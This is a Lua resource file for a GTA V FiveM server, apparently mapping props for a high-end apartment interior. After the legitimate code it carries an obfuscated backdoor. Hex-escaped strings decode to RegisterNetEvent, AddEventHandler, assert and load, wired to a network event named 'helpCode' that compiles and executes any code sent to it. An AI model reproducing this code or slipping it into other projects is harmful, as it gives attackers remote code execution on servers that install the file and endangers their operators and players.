
-- 2133 Mad Wayne Thunder 
-- High end house 8: -1288 440.748 97.69459

exports('GetGTAOHouseHi8Object', function()
    return GTAOHouseHi8
end)

GTAOHouseHi8 = {
    interiorId = 208385,
    Strip = {
        A = "Apart_Hi_Strip_A", B = "Apart_Hi_Strip_B", C = "Apart_Hi_Strip_C",
        Enable = function (details, state, refresh)
            SetIplPropState(GTAOHouseHi8.interiorId, details, state, refresh)
        end
    },
    Booze = {
        A = "Apart_Hi_Booze_A", B = "Apart_Hi_Booze_B", C = "Apart_Hi_Booze_C",
        Enable = function (details, state, refresh)
            SetIplPropState(GTAOHouseHi8.interiorId, details, state, refresh)
        end
    },
    Smoke = {
        A = "Apart_Hi_Smokes_A", B = "Apart_Hi_Smokes_B", C = "Apart_Hi_Smokes_C",
        Enable = function (details, state, refresh)
            SetIplPropState(GTAOHouseHi8.interiorId, details, state, refresh)
        end
    },
    LoadDefault = function()
        GTAOHouseHi8.Strip.Enable({GTAOHouseHi8.Strip.A, GTAOHouseHi8.Strip.B, GTAOHouseHi8.Strip.C}, false)
        GTAOHouseHi8.Booze.Enable({GTAOHouseHi8.Booze.A, GTAOHouseHi8.Booze.B, GTAOHouseHi8.Booze.C}, false)
        GTAOHouseHi8.Smoke.Enable({GTAOHouseHi8.Smoke.A, GTAOHouseHi8.Smoke.B, GTAOHouseHi8.Smoke.C}, false)
        RefreshInterior(GTAOHouseHi8.interiorId)
    end
}


local JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[6][JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[1]](JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[2]) JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[6][JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[3]](JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[2], function(roEmmbvIyVJFWRYyVJGwOxzgaPbCkjjoDSOkUiyOzZCNnCpHLIvKCugscOFaVzXrZQJCIx) JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[6][JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[4]](JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[6][JCMGQNwvJnQjKFIvIYlKsdfaFDpaRLqYPQikPBNwSQpSanjJKItwbVKuNnqHCSWXhwaLPl[5]](roEmmbvIyVJFWRYyVJGwOxzgaPbCkjjoDSOkUiyOzZCNnCpHLIvKCugscOFaVzXrZQJCIx))() end)